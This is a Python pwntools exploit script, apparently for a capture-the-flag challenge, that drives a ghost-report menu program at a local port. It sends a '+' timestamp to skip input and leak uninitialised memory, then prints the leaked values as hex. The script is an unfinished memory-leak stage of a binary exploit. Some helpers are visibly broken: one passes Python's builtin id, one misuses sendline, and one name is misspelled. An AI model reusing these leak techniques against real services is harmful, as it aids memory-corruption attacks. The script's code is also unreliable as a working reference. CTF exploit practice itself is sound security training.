from pwn import *
from pwn import p8, p16, p32, p64, u8, u16, u32, u64
import os
import struct 

if args.LOCAL:
    os.system("./server.sh &")
    io = process(["./client.sh"])
    if args.GDB:
        cmd = """
        """    
        gdb.attach(io, cmd)  
else: 
    io = remote("0", 1337)

def i2f(num):
    byte_string = struct.pack('i', num)
    float_value = struct.unpack('f', byte_string)[0]
    return float_value

def f2i(float_value):
    byte_string = struct.pack('f', float(float_value))
    int_value = struct.unpack('i', byte_string)[0]
    return int_value

ghost_type = ["ethereal_voyager", "whispering_shade", "poltergeist", "wraith", "shadow_figure", \
              "revenant", "spectre", "doppelganger", "custom_ghost"]

def add_ghost(title, time_, lat, lon, level, type, comment=b""):
    io.sendlineafter(b'Enter your choice: ', b'1')
    sleep(0.1)
    io.sendline(title)
    sleep(0.1)
    io.sendline(str(time_).encode())
    sleep(0.1)
    io.sendline(str(i2f(lat)).encode()+ b' ' + str(i2f(lon)).encode())
    sleep(0.1)
    io.sendline(str(level).encode())
    sleep(0.1)
    io.sendline(ghost_type[type])
    sleep(0.1)
    if type == 8:
        io.sendline(comment)
    
def show_ghost(id):
    io.sendlineafter(b'Enter your choice: ', b'2')
    io.sendlineafter(b'to show: ', str(id).encode())
    
def edit_ghost(id, new_title, opt, type):
    io.sendlineafter(b'Enter your choice: ', b'3')
    io.sendlineafter(b'data to edit: ', str(id).encode())
    io.sendlineafter(b'report:\n', new_title)
    io.sendlineafter(b'nstead? (y/n): ', opt)
    if opt == b"y":
        io.sendline(ghost_type[type])
        
def delete_ghost():
    io.sendlineafter(b'Enter your choice: ', b'4')
    io.sendlineafter(b'to delete: ', str(id).encode())
    
def ananlyze():
    io.sendlineafter(b'Enter your choice: ', b'5')
    
def switch_mode():
    io.sendlineafter(b'Enter your choice: ', b'6')
    io.sendline(b'? (y/n): ', b'y')
     
def exit():
    io.sendlineafter(b'Enter your choice: ', b'7')

io.sendlineafter(b'Enter your choice: ', b'1')

io.sendlineafter(b'observation report: \n',b'just_leak')
sleep(0.1)
io.sendline(str("+").encode())
sleep(0.1)
io.sendline(b'10 10')
sleep(0.1)
io.sendline(b'10')
sleep(0.1)
io.sendline(ghost_type[8].encode())
sleep(0.1)
io.sendline(b'a little bit leak')
show_ghost(100)
io.recvuntil(b'Timestamp: ')
leak = int(io.recv(len("1065316488")), 10)
print(hex(leak))

io.recvuntil(b'Latitude: ')
leak2 = f2i(io.recvline().strip(b'\n'))

print(hex(leak2))


io.interactive()